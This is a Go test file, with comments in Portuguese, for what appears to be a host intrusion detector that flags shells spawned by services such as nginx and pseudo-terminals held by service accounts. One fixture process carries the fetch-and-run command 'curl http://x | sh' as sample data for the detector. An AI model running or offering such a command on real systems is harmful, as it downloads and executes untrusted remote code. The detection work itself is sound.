package checks

import (
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/check"
	"github.com/lex0c/aletheia/internal/facts"
)

// O processo isolado quase nunca é o sinal: `curl` é rotina, `curl` filho de
// `sh` filho de `nginx` é pós-exploração. A diferença está na LINHAGEM.
func TestShellDeServicoContaACadeiaInteira(t *testing.T) {
	f := &facts.Facts{Processes: []facts.Process{
		{PID: 9, PPID: 1, Comm: "nginx", Exe: "/usr/sbin/nginx", UID: 0},
		{PID: 16, PPID: 9, Comm: "sh", Exe: "/bin/dash", UID: 33,
			Argv: []string{"/bin/sh", "-c", "curl http://x | sh"}},
		{PID: 17, PPID: 16, Comm: "curl", Exe: "/usr/bin/curl", UID: 33},
	}}
	r := shellDeServico.Run(shellDeServico, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevCritical {
		t.Fatalf("achados = %v", r.Findings)
	}
	ev := strings.Join(r.Findings[0].Evidence, " ")
	for _, quer := range []string{"nginx", "servidor web", "curl (pid=17)"} {
		if !strings.Contains(ev, quer) {
			t.Errorf("falta %q — a cadeia inteira é a evidência:\n%s", quer, ev)
		}
	}
}

func TestShellDeServicoNaoDisparaEmShellComum(t *testing.T) {
	f := &facts.Facts{Processes: []facts.Process{
		{PID: 100, PPID: 1, Comm: "sshd", Exe: "/usr/sbin/sshd"},
		{PID: 101, PPID: 100, Comm: "bash", Exe: "/bin/bash"}, // login SSH é o normal
		{PID: 102, PPID: 101, Comm: "curl", Exe: "/usr/bin/curl"},
	}}
	if r := shellDeServico.Run(shellDeServico, f, testEnv()); len(r.Findings) != 0 {
		t.Errorf("sshd gerando shell é login, não pós-exploração: %v", r.Findings[0].Evidence)
	}
}

// PTY não é malicioso: é o normal de toda sessão SSH. O sinal é QUEM o tem.
func TestPtyDeServicoOlhaQuemTem(t *testing.T) {
	comPTY := []facts.FD{{N: 0, PTY: true, Target: "/dev/pts/3"}}
	f := &facts.Facts{Processes: []facts.Process{
		{PID: 10, Comm: "sh", Exe: "/bin/dash", UID: 500, FDs: comPTY},    // serviço
		{PID: 11, Comm: "bash", Exe: "/bin/bash", UID: 1000, FDs: comPTY}, // pessoa
		{PID: 12, Comm: "bash", Exe: "/bin/bash", UID: 0, FDs: comPTY},    // root: o admin
		{PID: 13, Comm: "sh", Exe: "/bin/dash", UID: 500},                 // sem terminal
	}}
	r := ptyDeServico.Run(ptyDeServico, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Subject != "pid=10" {
		t.Fatalf("achados = %v", r.Findings)
	}
}
